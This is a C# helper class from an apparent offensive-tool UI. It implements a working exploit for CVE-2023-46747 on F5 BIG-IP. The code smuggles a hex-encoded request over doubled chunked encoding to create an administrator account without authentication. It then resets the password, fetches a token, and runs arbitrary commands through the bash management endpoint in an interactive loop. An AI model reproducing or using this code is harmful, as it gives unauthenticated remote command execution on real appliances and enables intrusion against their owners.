﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using Newtonsoft.Json;

namespace OelianderUI.Helpers
{
    public class F5Helper
    {
        private static readonly HttpClient client = new HttpClient();

        public static async Task TryExploitF5(string targetIp, string ProxyAddress)
        {
            string targetUrl = targetIp;
            string proxyUrl = ProxyAddress;

            Uri targetUri = new Uri(targetUrl.EndsWith("/") ? targetUrl : targetUrl + "/");

            Dictionary<string, string> proxy = null;
            if (!string.IsNullOrEmpty(proxyUrl))
            {
                if (await DetermineWhetherToUseBurpSuite(proxyUrl))
                {
                    Objects.f5Page.AddLog("\033[94m[*] DO NOT USE BURPSUITE!!! For details, please see https://github.com/W01fh4cker/CVE-2023-46747-RCE/issues/3\033[0m");
                    return;
                }
                proxy = new Dictionary<string, string>
            {
                { "http", proxyUrl },
                { "https", proxyUrl }
            };
            }

            await Exploit(targetUri, proxy);
        }

        public static async Task<bool> DetermineWhetherToUseBurpSuite(string proxyUrl)
        {
            try
            {
                var faviconUrl = $"{proxyUrl}/favicon.ico";
                var response = await client.GetAsync(faviconUrl);
                if (response.IsSuccessStatusCode)
                {
                    return true;
                }
            }
            catch
            {
                return false;
            }
            return false;
        }

        public static string GenerateRandomString(int length)
        {
            const string charset = "abcdefghijklmnopqrstuvwxyz0123456789";
            var random = new Random();
            return new string(Enumerable.Range(0, length).Select(_ => charset[random.Next(charset.Length)]).ToArray());
        }

        public static string GetRandomUserAgent()
        {
            var userAgentList = new List<string>
        {
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.89 Safari/537.36"
        };
            var random = new Random();
            return userAgentList[random.Next(userAgentList.Count)];
        }

        public static async Task<bool> UnauthCreateUser(Uri target, string username, string password, Dictionary<string, string> proxy)
        {
            string loginRequestHex = "0008485454502f312e310000122f746d75692f436f6e74726f6c2f666f726d0000093132372e302e302e310000096c6f63616c686f73740000096c6f63616c686f7374000050000003000b546d75692d44756262756600000b424242424242424242424200000a52454d4f5445524f4c450000013000a00b00096c6f63616c686f73740003000561646d696e000501715f74696d656e6f773d61265f74696d656e6f775f6265666f72653d2668616e646c65723d253266746d756925326673797374656d25326675736572253266637265617465262626666f726d5f706167653d253266746d756925326673797374656d253266757365722532666372656174652e6a737025336626666f726d5f706167655f6265666f72653d26686964654f626a4c6973743d265f62756676616c75653d65494c3452556e537758596f5055494f47634f4678326f30305863253364265f62756676616c75655f6265666f72653d2673797374656d757365722d68696464656e3d5b5b2241646d696e6973747261746f72222c225b416c6c5d225d5d2673797374656d757365722d68696464656e5f6265666f72653d266e616d653d" + username + "266e616d655f6265666f72653d267061737377643d" + password + "267061737377645f6265666f72653d2666696e69736865643d782666696e69736865645f6265666f72653d00ff00";
            var loginData = Encoding.UTF8.GetBytes("204\r\n" + loginRequestHex + "\r\n0\r\n\r\n");
            HttpResponseMessage response = null;
            var request = new HttpRequestMessage(HttpMethod.Post, new Uri(target, "/tmui/login.jsp"))
            {
                Headers =
            {
                { "Content-Type", "application/x-www-form-urlencoded" },
                { "Transfer-Encoding", "chunked, chunked" },
                { "User-Agent", GetRandomUserAgent() }
            },
                Content = new ByteArrayContent(loginData)
            };

            if (proxy != null)
            {
                var proxyHandler = new HttpClientHandler
                {
                    Proxy = new System.Net.WebProxy(proxy["http"]),
                    UseProxy = true
                };
                var clientWithProxy = new HttpClient(proxyHandler);
                response = await clientWithProxy.SendAsync(request);
            }
            else
            {
                response = await client.SendAsync(request);
            }

            return response.IsSuccessStatusCode;
        }

        public static async Task<string> ResetPassword(Uri target, string user, string password, Dictionary<string, string> proxy)
        {
            string url = $"{target}/mgmt/tm/auth/user/{user}";
            var headers = new Dictionary<string, string> { { "Content-Type", "application/json" } };
            var targetJson = new Dictionary<string, string> { { "password", password } };

            var jsonContent = JsonConvert.SerializeObject(targetJson);

            var request = new HttpRequestMessage(HttpMethod.Patch, url)
            {
                Content = new StringContent(jsonContent, Encoding.UTF8, "application/json")
            };

            var response = await client.SendAsync(request);
            if (response.IsSuccessStatusCode)
            {
                return "1";
            }

            return string.Empty;
        }

        public static async Task<string> GetToken(Uri target, string user, string password, Dictionary<string, string> proxy)
        {
            string url = $"{target}/mgmt/shared/authn/login";
            var headers = new Dictionary<string, string> { { "Content-Type", "application/json" } };
            var targetJson = new Dictionary<string, string> { { "username", user }, { "password", password } };

            var jsonContent = JsonConvert.SerializeObject(targetJson);

            var request = new HttpRequestMessage(HttpMethod.Post, url)
            {
                Content = new StringContent(jsonContent, Encoding.UTF8, "application/json")
            };

            var response = await client.SendAsync(request);
            if (response.IsSuccessStatusCode)
            {
                var content = await response.Content.ReadAsStringAsync();
                dynamic jsonResponse = JsonConvert.DeserializeObject(content);
                return jsonResponse.token.token;
            }

            return string.Empty;
        }

        public static async Task<string> ExecCommand(Uri target, string token, string cmd, Dictionary<string, string> proxy)
        {
            string url = $"{target}/mgmt/tm/util/bash";
            var headers = new Dictionary<string, string> { { "X-F5-Auth-Token", token } };
            var cmdJson = new Dictionary<string, string> { { "command", "run" }, { "utilCmdArgs", $"-c \"{cmd}\"" } };

            var jsonContent = JsonConvert.SerializeObject(cmdJson);

            var request = new HttpRequestMessage(HttpMethod.Post, url)
            {
                Content = new StringContent(jsonContent, Encoding.UTF8, "application/json")
            };

            var response = await client.SendAsync(request);
            if (response.IsSuccessStatusCode)
            {
                var content = await response.Content.ReadAsStringAsync();
                dynamic jsonResponse = JsonConvert.DeserializeObject(content);
                return jsonResponse.commandResult.ToString().TrimEnd('\n');
            }

            return string.Empty;
        }

        public static async Task Exploit(Uri target, Dictionary<string, string> proxy)
        {
            string username = GenerateRandomString(5);
            string password = GenerateRandomString(12);
            var a = $"[*] start to attack: {target}";
            Objects.f5Page.AddLog($"\033[94m{a}\033[0m");
            Objects.obj.SaveLog(a, "F5BigIP");

            if (await UnauthCreateUser(target, username, password, proxy))
            {
                var b = $"[*] It seems that the user may have been successfully created without authorization and is trying to obtain a token to verify.";
                var c = "[*] Changing initial password to the same thing. Required for first login.";
                Objects.f5Page.AddLog($"\033[94m{b}\033[0m");
                Objects.f5Page.AddLog($"\033[94m{c}\033[0m");
                Objects.obj.SaveLog($"{b}\n{c}", "F5BigIP");

                var pwChange = await ResetPassword(target, username, password, proxy);
                if (pwChange != "")
                {
                    var token = await GetToken(target, username, password, proxy);
                    if (!string.IsNullOrEmpty(token))
                    {
                        var scanResult = $"\033[92m[+] username: [{username}], password: [{password}], token: [{token}]. The website {target} has vulnerability CVE-2023-46747!\033[0m";
                        Objects.f5Page.AddLog(scanResult);
                        Objects.obj.SaveLog(scanResult, "F5BigIP");
                        Objects.f5Page.AddLog("\033[94m[*] start executing commands freely~\033[0m");

                        while (true)
                        {
                            Objects.f5Page.AddLog("\033[93mCVE-2023-46747-RCE \033[0m");
                            string cmd = Objects.obj.OpenDialogWindowWithResult("Command", "Enter the command you want to execute");
                            if (!string.IsNullOrEmpty(cmd))
                            {
                                string result = await ExecCommand(target, token, cmd, proxy);
                                if (!string.IsNullOrEmpty(result))
                                {
                                    Objects.f5Page.AddLog(result);
                                    Objects.obj.SaveLog(result, "F5BigIP");
                                }
                                else
                                {
                                    var d = $"[-] username: [{username}], password: [{password}]. Failed to execute command.";
                                    Objects.f5Page.AddLog($"\033[91m{d}\033[0m");
                                    Objects.obj.SaveLog(d, "F5BigIP");
                                }
                            }
                        }
                    }
                    else
                    {
                        var e = $"[-] username: [{username}], password: [{password}]. Failed to obtain token.";
                        Objects.f5Page.AddLog($"\033[91m{e}\033[0m");
                        Objects.obj.SaveLog(e, "F5BigIP");
                    }
                }
                else
                {
                    var f = $"[-] username: [{username}], password: [{password}]. Unable to change initial password.";
                    Objects.f5Page.AddLog($"\033[91m{f}\033[0m");
                    Objects.obj.SaveLog(f, "F5BigIP");
                }
            }
            else
            {
                var g = $"[-] There is no vulnerability in this site {target}.";
                Objects.f5Page.AddLog($"\033[91m{g}\033[0m");
                Objects.obj.SaveLog(g, "F5BigIP");
            }
        }
    }
}
